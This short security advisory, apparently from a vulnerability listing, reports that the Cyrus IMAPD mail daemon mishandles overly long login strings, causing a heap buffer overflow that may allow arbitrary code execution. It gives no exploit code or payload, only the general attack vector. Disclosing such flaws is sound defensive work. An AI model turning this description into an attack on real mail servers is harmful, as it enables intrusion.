Cyrus IMAPD is a freely available, open source Interactive Mail Access Protocol (IMAP) daemon. It is available for Unix and Linux operating systems.

It has been reported that Cyrus IMAPD does not sufficiently handle overly long strings. In some cases, when a user connects to the daemon, and upon negotiating the connection sends a login string of excessive length, a buffer overflow occurs. This could result in heap corruption and arbitrary words in memory being overwritten. It may be possible to exploit this issue to execute arbitrary code.
